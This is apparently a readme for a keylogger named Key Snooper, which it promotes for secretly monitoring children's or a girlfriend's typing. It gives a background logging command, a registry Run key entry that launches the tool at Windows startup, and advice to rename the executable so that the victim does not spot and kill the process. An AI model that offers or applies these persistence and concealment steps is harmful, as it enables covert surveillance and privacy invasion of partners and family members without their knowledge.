Key Snooper is a utility for monitering 
what keys are typed into the keyboard.
You will be able to see what your 
children are talking about, or who your
girl friend may be talking to.

To test the program, compile into an EXE
and run it.  You will be presented with
a program that will type out any keystroke
it encounters from other applications.
For example, click the "Start Snooping"
button and then open up Notepad.  Begin
typing letters in note pad and watch
the Snooper catch all the keys.

KeySnooper can be loaded in the background
as long as you pass it a file name.
For example:

KeySnooper.exe KeyboardLog.txt

The snooper program will understand
the file name and create it in the
same directory as the EXE file.

Key snooper is especially useful if you
set it up to run in the background when
windows starts up.  When using the
registry, you may damage and event
destroy your operating system if you
do not know what you are doing.  I will
not be held accountable.  You may use
the following example to assist you 
in setting up the program to run in
the background:

Key:
	HKEY_LOCAL_MACHINE\
	SOFTWARE\
	Microsoft\
	Windows\
	CurrentVersion\
	Run
Name: 
	KeySnooper
Type: 
	REG_SZ
Data: 
	C:\KeySnooper\KeySnooper.exe Log.txt

When the program is running, it can be seen
in the task manager.  It will be running as
the name of the executable file

	"KeySnooper.exe"

You may rename the file to an ambiguouse
name to prevent someones best interest to
delete the process.